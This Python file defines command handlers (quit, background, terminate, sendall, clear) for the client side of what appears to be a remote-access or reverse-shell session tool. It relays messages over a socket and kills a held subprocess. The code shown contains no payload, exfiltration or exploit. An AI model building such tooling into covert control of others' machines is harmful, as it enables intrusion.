import os

from client.commands.base import Command
from client.modules.process_ops import sendall_command


class QuitCommand(Command):
    name = 'quit'

    def execute(self, ctx, raw: str):
        from client.core.protocol import Protocol
        Protocol(ctx.sock).send('[+] Session terminated')
        return False


class BackgroundCommand(Command):
    name = 'background'

    def execute(self, ctx, raw: str):
        ctx.protocol.send('[+] Session backgrounded')
        return True


class HelpCommand(Command):
    name = 'help'

    def execute(self, ctx, raw: str):
        return True


class ClearCommand(Command):
    name = 'clear'
    aliases = ['cls']

    def execute(self, ctx, raw: str):
        os.system(ctx.platform.clear_screen_cmd())
        return True


class TerminateCommand(Command):
    name = 'terminate'

    def execute(self, ctx, raw: str):
        proc = ctx.proc_holder.get('proc')
        if proc:
            try:
                proc.kill()
            except Exception:
                pass
        ctx.proc_holder['proc'] = None
        return True


class SendallCommand(Command):
    name = 'sendall'

    def execute(self, ctx, raw: str):
        cmd = raw[8:].strip()
        sendall_command(ctx.protocol, cmd)
        return True
